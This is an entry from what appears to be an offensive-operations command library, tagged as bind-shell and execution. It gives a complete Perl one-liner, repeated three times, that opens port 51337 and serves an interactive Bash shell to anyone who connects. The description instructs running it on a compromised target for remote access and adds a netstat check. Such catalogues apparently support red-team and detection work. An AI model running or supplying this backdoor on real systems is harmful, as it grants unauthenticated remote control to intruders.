---
id: 1a9d38de-d65b-4549-b8cc-3727496dbb53
name: perl-bind-shell-listener
type: command
executor: bash
data: >-
  perl -e 'use
  Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,
  INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close
  C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash
  -i");};'
output: null
created_at: '2023-04-06T03:56:08.747540+00:00'
updated_at: '2023-04-10T20:21:16.647403+00:00'
platforms:
  - Linux
  - Unix
tags:
  - bind-shell
  - perl
  - execution
verified: true
validated: true
---

# perl-bind-shell-listener

## Command

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Description

Executes a Perl one-liner to create a bind shell listener on the target system, opening port 51337 for incoming connections and spawning an interactive Bash shell upon connection. Run this on the compromised target to enable remote access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Port hardcoded to 51337; modify $p in code for custom port | No |

## Examples

### Basic Usage

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

### Advanced Usage

To use a different port, edit the one-liner: replace 51337 with $_PORT.

## Expected Output

The command will hang indefinitely with no output, indicating the listener is active and waiting for connections. Verify with `netstat -tuln | grep 51337` showing tcp 0 0 0.0.0.0:51337.

## Related

- [[procedures/Create-Perl-Bind-Shell]]
- [[commands/nc-connect-to-bind-shell]]
